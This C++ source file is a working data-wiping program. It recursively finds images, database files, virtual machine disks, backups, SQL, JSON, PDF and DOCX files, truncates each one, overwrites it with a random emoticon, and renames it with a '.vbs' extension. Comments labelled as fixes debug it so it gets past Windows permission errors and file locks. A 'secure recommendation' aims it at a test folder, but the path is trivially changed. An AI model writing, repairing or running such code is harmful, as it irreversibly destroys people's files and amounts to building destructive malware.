#include <iostream>
#include <fstream>
#include <string>
#include <filesystem>
#include <algorithm>
#include <vector>
#include <random>

namespace fs = std::filesystem;
using namespace std;

void execute_payload(string p) {
    vector<string> f = {":3","OwO",">w<","^w^"};
    random_device rd; mt19937 g(rd());
    uniform_int_distribution<> d(0, f.size()-1);
    uniform_int_distribution<> r(1, 100);

    if (!fs::exists(p)) return;
    vector<fs::path> t;

    try {
        // FIX 1: Added skip_permission_denied to prevent the iterator from crashing 
        // when it encounters a restricted Windows system or hidden folder.
        auto options = fs::directory_options::skip_permission_denied;
        for (auto& e : fs::recursive_directory_iterator(p, options)) {
            if (!e.is_regular_file()) continue;
            
            string x = e.path().extension().string();
            transform(x.begin(), x.end(), x.begin(), ::tolower);
            
            if (x==".jpg"||x==".png"||x==".mdf"||x==".ldf"|| 
                x==".vhdx"||x==".vmdk"||x==".parquet"||x==".avro"|| 
                x==".bak"||x==".sql"||x==".json"||x==".pdf"|| 
                x==".vbs"||x==".bat"||x==".gdoc"||x==".docx") 
                { t.push_back(e.path()); }
        }
    } catch (...) {}

    for (auto& fp : t) {
        string b = (r(g) == 1) ? "X3" : f[d(g)];
        try {
            // FIX 2: Explicit block scope introduced via curly braces.
            // The ofstream variable 's' only lives inside this block.
            {
                ofstream s(fp, ios::trunc);
                if (s.is_open()) {
                    s << b;
                }
            } // <- 's' is destroyed here, closing the handle and releasing the Windows file lock.

            // The file lock is now gone, allowing Windows to successfully process the rename.
            if (fp.extension() != ".vbs") { 
                fs::rename(fp, fp.string() + ".vbs"); 
            }
        } catch (...) {}
    }
}

int main() { 
    // Secure recommendation: Target a specific, isolated local test directory
    // rather than general paths like "./" to protect system environment stability.
    execute_payload("./test_folder"); 
    return 0; 
}
